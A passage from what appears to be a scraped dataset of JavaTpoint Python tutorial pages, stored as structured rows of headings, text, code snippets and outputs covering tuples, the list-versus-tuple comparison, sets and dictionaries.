'tuple'>\n<class 'tuple'>\n<class 'tuple'>"", ""<class 'str'>\n<class 'tuple'>"", '(10, 20, 30, 40, 50, 60)\ntuple1[0] = 10\ntuple1[1] = 20\ntuple1[2] = 30\ntuple1[3] = 40\ntuple1[4] = 50\ntuple1[5] = 60', ""Enter the tuple elements ...123456\n('1', '2', '3', '4', '5', '6')\ntuple1[0] = 1\ntuple1[1] = 2\ntuple1[2] = 3\ntuple1[3] = 4\ntuple1[4] = 5\ntuple1[5] = 6"", '1\n2\n3\ntuple index out of range', '(2, 3, 4, 5, 6, 7)\n(1, 2, 3, 4)\n(1, 2, 3, 4)\n(1, 3, 5)', '5\n2\n(3, 4)\n(1, 2, 3, 4)\n(4, 5)', '(1, 2, 3, 4, 5, 6)\nTraceback (most recent call last):\n  File ""tuple.py"", line 4, in <module>\n    print(tuple1)\nNameError: name \'tuple1\' is not defined', 'T1*2 = (1, 2, 3, 4, 5, 1, 2, 3, 4, 5)', 'T1+T2 = (1, 2, 3, 4, 5, 6, 7, 8, 9)', 'print (2 in T1) prints True.', 'for i in T1: \n    print(i)', '1\n2\n3\n4\n5', 'len(T1) = 5']","['Operator|||Description|||Example&&&Repetition|||The repetition operator enables the tuple elements to be repeated multiple times.|||T1*2 = (1, 2, 3, 4, 5, 1, 2, 3, 4, 5)&&&Concatenation|||It concatenates the tuple mentioned on either side of the operator.|||T1+T2 = (1, 2, 3, 4, 5, 6, 7, 8, 9)&&&Membership|||It returns true if a particular item exists in the tuple otherwise false|||print (2 in T1) prints True.&&&Iteration|||The for loop is used to iterate over the tuple elements.|||for i in T1: |||    print(i)|||Output|||1|||2|||3|||4|||5&&&Length|||It is used to get the length of the tuple.|||len(T1) = 5', 'SN|||Function|||Description&&&1|||cmp(tuple1, tuple2)|||It compares two tuples and returns true if tuple1 is greater than tuple2 otherwise false.&&&2|||len(tuple)|||It calculates the length of the tuple.&&&3|||max(tuple)|||It returns the maximum element of the tuple', 'SN|||List|||Tuple']",[]
22,['Python List Vs Tuple'],"['In this tutorial, we will learn the important difference between the list and tuples and how both are playing a significant role in Python.']","['https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-set']",[],[],"['Representation Differences', 'Mutable Lists and Immutable Tuples', 'Debugging', 'Functions Support', 'Memory Efficient', 'Conclusion']",[],[],"[""Let's discuss the main differences in the following points."", 'Consider the following example.', 'Now we are changing 0th index element ""Peter"" to ""Samson"".', 'Now we create a tuple and do the same thing.', 'We get an error while changing the 1st element of the tuple because of immutability. It does not support item assignment.', ""It will be very complicated to track those changes in lists but immutable object tuple can't change after created."", 'So tuples are easy to debug.', 'The tuples support less operation than the list. The inbuilt dir(object) is used to get all the supported functions for the list and tuple.']","['In the above program, we defined a list1 variable which holds a list of different data type from index 0 to 4. We defined another variable tuple1, which holds a tuple of different data types. It is enclosed by the ().', ""The tuples are easy to debug in a big project because of its immutability. If we have a small project or less number of data, then lists play an effective role. Let's consider the following example:"", 'The tuples are more memory efficient than the list because tuple has less built-in operations. Lists are suitable for the fewer elements whereas tuples are a bit faster than the list for the huge amount of data.']","['Lists and Tuples are used to store one or more Python objects or data-types sequentially. Both can store any data such as integer, float, string, and dictionary. Lists and Tuples are similar in most factors but here we will describe the main difference between them.', 'The representation of the Lists and tuple is marginally different. List are commonly enclosed with the square bracket [], and elements are comma-separated element. Tuples are enclosed with parenthesis (), and elements are separated by the comma. The parenthesis is optional to use, and these types of tuples are called tuple packing.', ""It is the most important difference between list and tuple whereas lists are mutable, and tuples are immutable. The lists are mutable which means the Python object can be modified after creation, whereas tuples can't be modified after creation. Consider the given an example."", 'In the above code, we did b = a; here we are not copying the list object from b to a. The b referred to the address of the list a. \xa0It means if we make the change in the b then that will reflect the same as in list a, and it makes debugging easy. But it is hard for the significant project where Python objects may have multiple references.']","[""list1 = ['JavaTpoint', 1, 2, 54.30, {'Name: ''Peter'}]"", 'print(type(list))', ""tuple1 = ('JavaTpoint',5,8,31.9,[1,2,3])"", 'print(type(tuple1))', 'a = [""Peter"",""Joseph"",""Mathew"",""Ricky""]', 'print(a)', 'a[0] = ""Samson""', 'print(a)', 'a = (10,20,""JavaTpoint"",30,40)', 'print(a)', 'a[0] = 50', 'a = [6,9,4,3,7,0,1]', '# Copying address of a in b', 'a[3] = ""JavaToint""', 'print(a)', 'dir(list)', 'dir(tuple)', 'Tuple = (1,2,3,4,5,6,7,8,9,0,5485,87525,955,3343,53234,6423,623456,234535)', 'List = [1,2,3,4,5,6,7,8,9,0,78,34,43,32,43,55,54,212,642,533,43434,54532 ]', ""print('Tuple size =', Tuple.__sizeof__())       # Tuple size = 52"", ""print('List size =', List.__sizeof__())"", 'list1 = [(101, ""Mike"", 24),(102, \'Hussey\', 26),(103, \'David\', 27),(104,  \'Warner\', 29)]', 'dict = {(""Mike"",22):24000}    #valid dictionary', 'dict = {[""Peter"",26]:25000}   #Invalid dictionary']","[""<class 'list'>"", ""<class 'tuple'>"", ""['Peter', 'Joseph', 'Mathew', 'Ricky']"", ""['Samson', 'Joseph', 'Mathew', 'Ricky']"", ""(10, 20, 'JavaTpoint', 30, 40)"", 'TypeError                                 Traceback (most recent call last)', '<ipython-input-5-52b2981fae12> in <module>', '----> 1 a[0] = 50', ""TypeError: 'tuple' object does not support item assignment"", ""[6, 9, 4, 'JavaToint', 7, 0, 1]"", ""['__add__','__class__','__contains__','__delattr__','__delitem__','__dir_,"", ""'__doc__','__eq__','__format__', '__get__','__getattribute__','__getitem_' '__gt__','__hash__','__iadd__','__imul__','__init__','__init_subclass__''__iter__','__le__','__len__','__lt__','__mul__', '__ne__','__new__',"", ""'__reduce__', '__reduce_ex__','__repr__','__reversed__','__rmul__','__setattr__','__setitem__','__sizeof__','__str__','__subclasshook__',"", ""'append',"", ""'clear',"", ""'copy',"", ""'count',"", ""'extend',"", ""'index',"", ""'insert',"", ""'pop',"", ""'remove',"", ""'reverse',"", ""'sort']"", ""['__add__',"", ""'__class__',"", ""'__contains__',"", ""'__delattr__',"", ""'__dir__',"", ""'__doc__',"", ""'__eq__',"", ""'__format__',"", ""'__ge__',"", ""'__getattribute__',"", ""'__getitem__',"", ""'__getnewargs__',"", ""'__gt__',"", ""'__hash__',"", ""'__init__',"", ""'__init_subclass__',"", ""'__iter__',"", ""'__le__',"", ""'__len__',"", ""'__lt__',"", ""'__mul__',"", ""'__ne__',"", ""'__new__',"", ""'__reduce__',"", ""'__reduce_ex__',"", ""'__repr__',"", ""'__rmul__',"", ""'__setattr__',"", ""'__sizeof__',"", ""'__str__',"", ""'__subclasshook__',"", ""'count',"", ""'index']"", 'Tuple size = 168', 'List size = 216']",[],"['|||List Functions||||||Tuple Functions||||||In Some cases, lists might seem more useful than tuples. But tuples are important data structures of the Python. Tuples are commonly used for unchangeable data or we can say that the data will be ""write- protected"" in the tuples. Tuples sends the indication to the Python interpreter the data should not change in the future.|||We can use tuple the same as a dictionary without using keys to store the data. For example-||||||Tuples can use for the dictionary keys because these are hashable and immutable whereas lists can\'t use a keys in dictionary.|||']"
23,['Python Set '],"['A Python set is the collection of the unordered items. Each element in the set must be unique, immutable, and the sets remove the duplicate elements. Sets are mutable which means we can modify it after its creation.']","['https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-set-add-method', 'https://www.javatpoint.com/python-set-discard-method', 'https://www.javatpoint.com/python-set-pop-method', 'https://www.javatpoint.com/python-set-remove-method', 'https://www.javatpoint.com/python-dictionary', 'https://www.javatpoint.com/python-tuples', 'https://www.javatpoint.com/python-dictionary']","['https://static.javatpoint.com/python/images/python-set.png', 'https://static.javatpoint.com/python/images/python-set2.png', 'https://static.javatpoint.com/python/images/python-set3.png', 'https://static.javatpoint.com/python/images/python-set4.png']",[],"['Creating a set', 'Adding items to the set', 'Removing items from the set', 'Difference between discard() and remove()', 'Python Set Operations', 'The intersection_update() method', 'Difference between the two sets', 'Symmetric Difference of two sets', 'Set comparisons', 'FrozenSets', 'Frozenset for the dictionary', 'Python Built-in set methods']","['Example 1: Using curly braces', 'Example 2: Using set() method', 'Example: 1 - Using add() method', 'Example - 2 Using update() function', 'Example-1 Using discard() method', 'Example-2 Using remove() function', 'Example-', 'Union of two Sets', 'Intersection of two sets', 'Set Programming Example']",[],"[""Let's see what happened if we provide the duplicate element to the set."", 'In the above code, we can see that set5 consisted of multiple duplicate elements when we printed it remove the duplicity from the set.', 'To add more than one item in the set, Python provides the update() method. It accepts iterable as an argument.', 'Consider the following example.', 'Consider the following example.', 'Python provides also the remove() method to remove the item from the set. Consider the following example to remove the items using remove() method.', 'Consider the following example to remove the item from the set using pop() method.', 'Python provides the clear() method to remove all the items from the set.', 'Consider the following example.', 'Despite the fact that discard() and remove() method both perform the same task, There is one main difference between discard() and remove().', ""On the other hand, if the item to be deleted from the set using remove() doesn't exist in the set, the Python will raise an error."", 'Consider the following example.', 'Consider the following example to calculate the union of two sets.', 'Example 1: using union | operator', 'Python also provides the union() method which can also be used to calculate the union of two sets. Consider the following example.', 'Example 2: using union() method', 'Consider the following example.', 'Example 1: Using & operator', 'Example 2: Using intersection() method', 'Example 3:', 'Consider the following example.', 'Consider the following example.', 'Example 1 : Using subtraction ( - ) operator', 'Example 2 : Using difference() method', 'Example - 1: Using ^ operator', 'Example - 2: Using symmetric_difference() method', 'Consider the following example.', 'Consider the following example to create the frozen set.', 'Consider the following example.', 'Example - 1: Write a program to remove the given number from the set.', 'Example - 2: Write a program to add multiple elements to the set.', 'Example - 3: Write a program to find the union between two set.', 'Example- 4: Write a program to find the intersection between two sets.', 'Example - 5: Write the program to add element to the frozenset.', ""Above code raised an error because frozensets are immutable and can't be changed after creation."", 'Example - 6: Write the program to find the issuperset, issubset and superset.', 'Python contains the following methods to be used with the sets. ']","['The set can be created by enclosing the comma-separated immutable items with the curly braces {}. Python also provides the set() method, which can be used to create the set by the passed sequence.', ""It can contain any type of element such as integer, float, tuple etc. But mutable elements (list, dictionary, set) can't be a member of set. Consider the following example."", 'In the above code, we have created two sets, the set set1 have immutable elements and set2 have one mutable element as a list. While checking the type of set2, it raised an error, which means set can contain only immutable elements.', 'Creating an empty set is a bit different because empty curly {} braces are also used to create a dictionary as well. So Python provides the set() method used without an argument to create an empty set.', ""We can also use the pop() method to remove the item. Generally, the pop() method will always remove the last item but the set is unordered, we can't determine which element will be popped from set."", 'In the above code, the last element of the Month set is March but the pop() method removed the June and January because the set is unordered and the pop() method could not determine the last element of the set.', ""If the key to be deleted from the set using discard() doesn't exist in the set, the Python will not give the error. The program maintains its control flow."", 'Set can be performed mathematical operation such as union, intersection, difference, and symmetric difference. Python provides the facility to carry out these operations with operators or methods. We describe these operations as follows.', 'The union of two sets is calculated by using the pipe (|) operator. The union of the two sets contains all the items that are present in both the sets.', 'The intersection of two sets can be performed by the and & operator or the intersection() function. The intersection of the two sets is given as the set of the elements that common in both sets.', 'The intersection_update() method removes the items from the original set that are not present in both the sets (all the sets if more than one are specified).', 'The intersection_update() method is different from the intersection() method since it modifies the original set by removing the unwanted items, on the other hand, the intersection() method returns a new set.', 'The symmetric difference of two sets is calculated by ^ operator or symmetric_difference() method. Symmetric difference of sets, it removes that element which is present in both sets. Consider the following example:', 'The frozen sets are the immutable form of the normal sets, i.e., the items of the frozen set cannot be changed and therefore it can be used as a key in the dictionary.', 'The elements of the frozen set cannot be changed after the creation. We cannot change or append the content of the frozen sets by using the methods like add() or remove().', 'The frozenset() method is used to create the frozenset object. The iterable sequence is passed into this method which is converted into the frozen set as a return type of the method.', 'If we pass the dictionary as the sequence inside the frozenset() method, it will take only the keys from the dictionary and returns a frozenset that contains the key of the dictionary as its elements.']","['Unlike other collections in Python, there is no index attached to the elements of the set, i.e., we cannot directly access any element of the set by the index. However, we can print them all together, or we can get the list of elements by looping through the set.', 'Python provides the add() method and update() method which can be used to add some particular item to the set. The add() method is used to add a single element whereas the update() method is used to add multiple elements to the set. Consider the following example.', 'Python provides the discard() method and remove() method which can be used to remove the items from the set. The difference between these function, using discard() function if the item does not exist in the set then the set remain unchanged whereas remove() method will through an error.', 'The difference of two sets can be calculated by using the subtraction (-) operator or intersection() method. Suppose there are two sets A and B, and the difference is A-B that denotes the resulting set will be obtained that element of A, which is not present in the set B.', 'Python allows us to use the comparison operators i.e., <, >, <=, >= , == with the sets by using which we can check whether a set is a subset, superset, or equivalent to other set. The boolean true or false is returned depending upon the items present inside the sets.']","['Days = {""Monday"", ""Tuesday"", ""Wednesday"", ""Thursday"", ""Friday"", ""Saturday"", ""Sunday""}', 'print(Days)', 'print(type(Days))', 'print(""looping through the set elements ... "")', 'for i in Days:', 'print(i)', 'Days = set([""Monday"", ""Tuesday"", ""Wednesday"", ""Thursday"", ""Friday"", ""Saturday"", ""Sunday""])', 'print(Days)', 'print(type(Days))', 'print(""looping through the set elements ... "")', 'for i in Days:', 'print(i)', '# Creating a set which have immutable elements', 'set1 = {1,2,3, ""JavaTpoint"", 20.5, 14}', 'print(type(set1))', '#Creating a set which have mutable element', 'set2 = {1,2,3,[""Javatpoint"",4]}', 'print(type(set2))', '# Empty curly braces will create dictionary', 'set3 = {}', 'print(type(set3))', '# Empty set using set() function', 'set4 = set()', 'print(type(set4))', 'set5 = {1,2,4,4,5,8,9,9,10}', 'print(""Return set with unique elements:"",set5)', 'Months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(months)', 'print(""\\nAdding other months to the set..."");', 'Months.add(""July"");', 'Months.add (""August"");', 'print(""\\nPrinting the modified set..."");', 'print(Months)', 'print(""\\nlooping through the set elements ... "")', 'for i in Months:', 'print(i)', 'Months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(Months)', 'print(""\\nupdating the original set ... "")', 'Months.update([""July"",""August"",""September"",""October""]);', 'print(""\\nprinting the modified set ... "")', 'print(Months);', 'months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(months)', 'print(""\\nRemoving some months from the set..."");', 'months.discard(""January"");', 'months.discard(""May"");', 'print(""\\nPrinting the modified set..."");', 'print(months)', 'print(""\\nlooping through the set elements ... "")', 'for i in months:', 'print(i)', 'months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(months)', 'print(""\\nRemoving some months from the set..."");', 'months.remove(""January"");', 'months.remove(""May"");', 'print(""\\nPrinting the modified set..."");', 'print(months)', 'Months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(Months)', 'print(""\\nRemoving some months from the set..."");', 'Months.pop();', 'Months.pop();', 'print(""\\nPrinting the modified set..."");', 'print(Months)', 'Months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(Months)', 'print(""\\nRemoving all the items from the set..."");', 'Months.clear()', 'print(""\\nPrinting the modified set..."")', 'print(Months)', 'Months = set([""January"",""February"", ""March"", ""April"", ""May"", ""June""])', 'print(""\\nprinting the original set ... "")', 'print(Months)', 'print(""\\nRemoving items through discard() method..."");', 'Months.discard(""Feb""); #will not give an error although the key feb is not available in the set', 'print(""\\nprinting the modified set..."")', 'print(Months)', 'print(""\\nRemoving items through remove() method..."");', 'Months.remove(""Jan"") #will give an error as the key jan is not available in the set.', 'print(""\\nPrinting the modified set..."")', 'print(Months)', 'Days1 = {""Monday"",""Tuesday"",""Wednesday"",""Thursday"", ""Sunday""}', 'Days2 = {""Friday"",""Saturday"",""Sunday""}', 'print(Days1|Days2) #printing the union of the sets', 'Days1 = {""Monday"",""Tuesday"",""Wednesday"",""Thursday""}', 'Days2 = {""Friday"",""Saturday"",""Sunday""}', 'print(Days1.union(Days2)) #printing the union of the sets', 'Days1 = {""Monday"",""Tuesday"", ""Wednesday"", ""Thursday""}', 'Days2 = {""Monday"",""Tuesday"",""Sunday"", ""Friday""}', 'print(Days1&Days2) #prints the intersection of the two sets', 'set1 = {""Devansh"",""John"", ""David"", ""Martin""}', 'set2 = {""Steve"", ""Milan"", ""David"", ""Martin""}', 'print(set1.intersection(set2)) #prints the intersection of the two sets', 'set1 = {1,2,3,4,5,6,7}', 'set2 = {1,2,20,32,5,9}', 'set3 = set1.intersection(set2)', 'print(set3)', 'a = {""Devansh"", ""bob"", ""castle""}', 'b = {""castle"", ""dude"", ""emyway""}', 'c = {""fuson"", ""gaurav"", ""castle""}', 'a.intersection_update(b, c)', 'print(a)', 'Days1 = {""Monday"",  ""Tuesday"", ""Wednesday"", ""Thursday""}', 'Days2 = {""Monday"", ""Tuesday"", ""Sunday""}', 'print(Days1-Days2) #{""Wednesday"", ""Thursday"" will be printed}', 'Days1 = {""Monday"",  ""Tuesday"", ""Wednesday"", ""Thursday""}', 'Days2 = {""Monday"", ""Tuesday"", ""Sunday""}', 'print(Days1.difference(Days2)) # prints the difference of the two sets Days1 and Days2', 'a = {1,2,3,4,5,6}', 'b = {1,2,9,8,10}', 'print(c)', 'a = {1,2,3,4,5,6}', 'b = {1,2,9,8,10}', 'c = a.symmetric_difference(b)', 'print(c)', 'Days1 = {""Monday"",  ""Tuesday"", ""Wednesday"", ""Thursday""}', 'Days2 = {""Monday"", ""Tuesday""}', 'Days3 = {""Monday"", ""Tuesday"", ""Friday""}', '#Days1 is the superset of Days2 hence it will print true.', 'print (Days1>Days2)', '#prints false since Days1 is not the subset of Days2', 'print (Days1', 'Frozenset = frozenset([1,2,3,4,5])', 'print(type(Frozenset))', 'print(""\\nprinting the content of frozen set..."")', 'for i in Frozenset:', 'print(i);', 'Frozenset.add(6) #gives an error since we cannot change the content of Frozenset after creation', 'Dictionary = {""Name"":""John"", ""Country"":""USA"", ""ID"":101}', 'print(type(Dictionary))', 'Frozenset = frozenset(Dictionary); #Frozenset will contain the keys of the dictionary', 'print(type(Frozenset))', 'for i in Frozenset:', 'print(i)', 'my_set = {1,2,3,4,5,6,12,24}', 'n = int(input(""Enter the number you want to remove""))', 'my_set.discard(n)', 'print(""After Removing:"",my_set)', 'set1 = set([1,2,4,""John"",""CS""])', 'set1.update([""Apple"",""Mango"",""Grapes""])', 'print(set1)', 'set1 = set([""Peter"",""Joseph"", 65,59,96])', 'set2  = set([""Peter"",1,2,""Joseph""])', 'set3 = set1.union(set2)', 'print(set3)', 'set1 = {23,44,56,67,90,45,""Javatpoint""}', 'set2 = {13,23,56,76,""Sachin""}', 'set3 = set1.intersection(set2)', 'print(set3)', 'set1 = {23,44,56,67,90,45,""Javatpoint""}', 'set2 = {13,23,56,76,""Sachin""}', 'set3 = set1.intersection(set2)', 'print(set3)', 'set1 = set([""Peter"",""James"",""Camroon"",""Ricky"",""Donald""])', 'set2 = set([""Camroon"",""Washington"",""Peter""])', 'set3 = set([""Peter""])', 'issubset = set1 >= set2', 'print(issubset)', 'issuperset = set1 <= set2', 'print(issuperset)', 'issubset = set3 <= set2', 'print(issubset)', 'issuperset = set2 >= set3', 'print(issuperset)']","[""{'Friday', 'Tuesday', 'Monday', 'Saturday', 'Thursday', 'Sunday', 'Wednesday'}\n<class 'set'>\nlooping through the set elements ... \nFriday\nTuesday\nMonday\nSaturday\nThursday\nSunday\nWednesday"", ""{'Friday', 'Wednesday', 'Thursday', 'Saturday', 'Monday', 'Tuesday', 'Sunday'}\n<class 'set'>\nlooping through the set elements ... \nFriday\nWednesday\nThursday\nSaturday\nMonday\nTuesday\nSunday"", '<class \'set\'>\n\nTraceback (most recent call last)\n<ipython-input-5-9605bb6fbc68> in <module>\n      4 \n      5 #Creating a set which holds mutable elements\n----> 6 set2 = {1,2,3,[""Javatpoint"",4]}\n      7 print(type(set2))\n\nTypeError: unhashable type: \'list\'', ""<class 'dict'>\n<class 'set'>"", 'Return set with unique elements: {1, 2, 4, 5, 8, 9, 10}', ""printing the original set ... \n{'February', 'May', 'April', 'March', 'June', 'January'}\n\nAdding other months to the set...\n\nPrinting the modified set...\n{'February', 'July', 'May', 'April', 'March', 'August', 'June', 'January'}\n\nlooping through the set elements ... \nFebruary\nJuly\nMay\nApril\nMarch\nAugust\nJune\nJanuary"", ""printing the original set ... \n{'January', 'February', 'April', 'May', 'June', 'March'}\n\nupdating the original set ... \nprinting the modified set ... \n{'January', 'February', 'April', 'August', 'October', 'May', 'June', 'July', 'September', 'March'}"", ""printing the original set ... \n{'February', 'January', 'March', 'April', 'June', 'May'}\n\nRemoving some months from the set...\n\nPrinting the modified set...\n{'February', 'March', 'April', 'June'}\n\nlooping through the set elements ... \nFebruary\nMarch\nApril\nJune"", ""printing the original set ... \n{'February', 'June', 'April', 'May', 'January', 'March'}\n\nRemoving some months from the set...\n\nPrinting the modified set...\n{'February', 'June', 'April', 'March'}"", ""printing the original set ... \n{'June', 'January', 'May', 'April', 'February', 'March'}\n\nRemoving some months from the set...\n\nPrinting the modified set...\n{'May', 'April', 'February', 'March'}"", ""printing the original set ... \n{'January', 'May', 'June', 'April', 'March', 'February'}\n\nRemoving all the items from the set...\n\nPrinting the modified set...\nset()"", 'printing the original set ... \n{\'March\', \'January\', \'April\', \'June\', \'February\', \'May\'}\n\nRemoving items through discard() method...\n\nprinting the modified set...\n{\'March\', \'January\', \'April\', \'June\', \'February\', \'May\'}\n\nRemoving items through remove() method...\nTraceback (most recent call last):\n  File ""set.py"", line 9, in \n    Months.remove(""Jan"")\nKeyError: \'Jan\'', ""{'Friday', 'Sunday', 'Saturday', 'Tuesday', 'Wednesday', 'Monday', 'Thursday'}"", ""{'Friday', 'Monday', 'Tuesday', 'Thursday', 'Wednesday', 'Sunday', 'Saturday'}"", ""{'Monday', 'Tuesday'}"", ""{'Martin', 'David'}"", '{1,2,5}', ""{'castle'}"", ""{'Thursday', 'Wednesday'}"", ""{'Thursday', 'Wednesday'}"", '{3, 4, 5, 6, 8, 9, 10}', '{3, 4, 5, 6, 8, 9, 10}', 'True\nFalse\nFalse', '<class \'frozenset\'>\n\nprinting the content of frozen set...\n1\n2\n3\n4\n5\nTraceback (most recent call last):\n  File ""set.py"", line 6, in <module>\n    Frozenset.add(6) #gives an error since we can change the content of Frozenset after creation \nAttributeError: \'frozenset\' object has no attribute \'add\'', ""<class 'dict'>\n<class 'frozenset'>\nName\nCountry\nID"", 'Enter the number you want to remove:12\nAfter Removing: {1, 2, 3, 4, 5, 6, 24}', ""{1, 2, 4, 'Apple', 'John', 'CS', 'Mango', 'Grapes'}"", ""{96, 65, 2, 'Joseph', 1, 'Peter', 59}"", '{56, 23}', ""TypeError: 'frozenset' object does not support item assignment"", 'False\nFalse\nTrue\nTrue']","['SN|||Method |||Description&&&1|||add(item)|||It adds an item to the set. It has no effect if the item is already present in the set. &&&2|||clear()|||It deletes all the items from the set. &&&3|||copy()|||It returns a shallow copy of the set. &&&4|||difference_update(....)|||It modifies this set by removing all the items that are also present in the specified sets. &&&5|||discard(item)|||It removes the specified item from the set. &&&6|||intersection()|||It returns a new set that contains only the common elements of both the sets. (all the sets if more than two are specified). &&&7|||intersection_update(....)|||It removes the items from the original set that are not present in both the sets (all the sets if more than one are specified).&&&8|||Isdisjoint(....)|||Return True if two sets have a null intersection.&&&9|||Issubset(....)|||Report whether another set contains this set.&&&10|||Issuperset(....)|||Report whether this set contains another set.&&&11|||pop()|||Remove and return an arbitrary set element that is the last element of the set. Raises KeyError if the set is empty.&&&12|||remove(item)|||Remove an element from a set; it must be a member. If the element is not a member, raise a KeyError.&&&13|||symmetric_difference(....)|||Remove an element from a set; it must be a member. If the element is not a member, raise a KeyError.&&&14|||symmetric_difference_update(....)|||Update a set with the symmetric difference of itself and another.&&&15|||union(....)|||Return the union of sets as a new set.(i.e. all elements that are in either set.)&&&16|||update()|||Update a set with the union of itself and others.']",[]
24,['Python Dictionary'],"['Python Dictionary is used to store the data in a key-value pair format. The dictionary is the data type in Python, which can simulate the real-life data arrangement where some specific value exists for some particular key. It is the mutable data-structure. The dictionary is defined into element Keys and values.']","['https://www.javatpoint.com/python-functions', 'https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-dictionary-clear-method', 'https://www.javatpoint.com/python-dictionary-copy-method', 'https://www.javatpoint.com/python-dictionary-fromkeys-method', 'https://www.javatpoint.com/python-dictionary-get-method', 'https://www.javatpoint.com/python-dictionary-items-method', 'https://www.javatpoint.com/python-dictionary-keys-method', 'https://www.javatpoint.com/python-dictionary-setdefault-method', 'https://www.javatpoint.com/python-dictionary-update-method', 'https://www.javatpoint.com/python-dictionary-values-method', 'https://www.javatpoint.com/python-dictionary-len-method', 'https://www.javatpoint.com/python-dictionary-popitem-method', 'https://www.javatpoint.com/python-dictionary-pop-method', 'https://www.javatpoint.com/python-dictionary-count-method', 'https://www.javatpoint.com/python-dictionary-index-method', 'https://www.javatpoint.com/python-functions', 'https://www.javatpoint.com/python-set', 'https://www.javatpoint.com/python-functions']",[],[],"['Creating the dictionary', 'Accessing the dictionary values', 'Adding dictionary values', 'Deleting elements using del keyword', 'Iterating Dictionary', 'Properties of Dictionary keys', 'Built-in Dictionary functions', 'Built-in Dictionary methods']","['Example 1', 'Example 2', 'Example - 3', 'Example 4']",[],"['In the above dictionary Dict, The keys Name and Age are the string that is an immutable object.', ""Let's see an example to create a dictionary and print its content."", 'We have discussed how the data can be accessed in the list and tuple by using the indexing.', 'However, the values can be accessed in the dictionary by using the keys as keys are unique in the dictionary.', 'The dictionary values can be accessed in the following way.', 'Note: If the key-value already present in the dictionary, the value gets updated. Otherwise, the new keys added in the dictionary.', ""Let's see an example to update the dictionary values."", 'Example - 1: ', 'Example - 2:', 'The items of the dictionary can be deleted by using the del keyword as given below.', 'The last print statement in the above code, it raised an error because we tried to print the Employee dictionary that already deleted.', 'The pop() method accepts the key as an argument and remove the associated value. Consider the following example.', 'A dictionary can be iterated using for loop as given below.', '# for loop to print all the keys of a dictionary', '#for loop to print all the values of the dictionary', '#for loop to print the values of the dictionary by using values() method.', '#for loop to print the items of the dictionary by using items() method.', 'Consider the following example.', 'Consider the following example.', 'The built-in python dictionary methods along with the description are given below.', 'The built-in python dictionary methods along with the description are given below.']","['In other words, we can say that a dictionary is the collection of key-value pairs where the value can be any Python object. In contrast, the keys are the immutable Python object, i.e., Numbers, string, or tuple.', 'The dictionary can be created by using multiple key-value pairs enclosed with the curly brackets {}, and each key is separated from its value by the colon (:).The syntax to define the dictionary is given below.', 'Python provides the built-in function dict() method which is also used to create dictionary. The empty curly braces {} is used to create empty dictionary.', 'Python provides us with an alternative to use the get() method to access the dictionary values. It would give the same result as given by the indexing.', 'The dictionary is a mutable data type, and its values can be updated by using the specific keys. The value can be updated along with key Dict[key] = value. The update() method is also used to update an existing value.', 'Python also provides a built-in methods popitem() and clear() method for remove elements from the dictionary. The popitem() removes the arbitrary element from a dictionary, whereas the clear() method removes all elements to the whole dictionary.', '1. In the dictionary, we cannot store multiple values for the same keys. If we pass more than one value for a single key, then the value which is last assigned is considered as the value of the key.', '2. In python, the key cannot be any mutable object. We can use numbers, strings, or tuples as the key, but we cannot use any mutable object like the list as the key in the dictionary.']",[],"['Dict = {""Name"": ""Tom"", ""Age"": 22}', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'print(type(Employee))', 'print(""printing Employee data .... "")', 'print(Employee)', '# Creating an empty Dictionary', 'Dict = {}', 'print(""Empty Dictionary: "")', 'print(Dict)', '# Creating a Dictionary', '# with dict() method', ""Dict = dict({1: 'Java', 2: 'T', 3:'Point'})"", 'print(""\\nCreate Dictionary by using  dict(): "")', 'print(Dict)', '# Creating a Dictionary', '# with each item as a Pair', ""Dict = dict([(1, 'Devansh'), (2, 'Sharma')])"", 'print(""\\nDictionary with each item as a pair: "")', 'print(Dict)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'print(type(Employee))', 'print(""printing Employee data .... "")', 'print(""Name : %s"" %Employee[""Name""])', 'print(""Age : %d"" %Employee[""Age""])', 'print(""Salary : %d"" %Employee[""salary""])', 'print(""Company : %s"" %Employee[""Company""])', '# Creating an empty Dictionary', 'Dict = {}', 'print(""Empty Dictionary: "")', 'print(Dict)', '# Adding elements to dictionary one at a time', ""Dict[0] = 'Peter'"", ""Dict[2] = 'Joseph'"", ""Dict[3] = 'Ricky'"", 'print(""\\nDictionary after adding 3 elements: "")', 'print(Dict)', '# Adding set of values', '# with a single Key', ""# The Emp_ages doesn't exist to dictionary"", ""Dict['Emp_ages'] = 20, 33, 24"", 'print(""\\nDictionary after adding 3 elements: "")', 'print(Dict)', ""# Updating existing Key's Value"", ""Dict[3] = 'JavaTpoint'"", 'print(""\\nUpdated key value: "")', 'print(Dict)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'print(type(Employee))', 'print(""printing Employee data .... "")', 'print(Employee)', 'print(""Enter the details of the new employee...."");', 'Employee[""Name""] = input(""Name: "");', 'Employee[""Age""] = int(input(""Age: ""));', 'Employee[""salary""] = int(input(""Salary: ""));', 'Employee[""Company""] = input(""Company:"");', 'print(""printing the new data"");', 'print(Employee)', 'Employee = {""Name"": ""John"", ""Age"": 29, ""salary"":25000,""Company"":""GOOGLE""}', 'print(type(Employee))', 'print(""printing Employee data .... "")', 'print(Employee)', 'print(""Deleting some of the employee data"")', 'del Employee[""Name""]', 'del Employee[""Company""]', 'print(""printing the modified information "")', 'print(Employee)', 'print(""Deleting the dictionary: Employee"");', 'del Employee', 'print(""Lets try to print it again "");', 'print(Employee)', '# Creating a Dictionary', ""Dict = {1: 'JavaTpoint', 2: 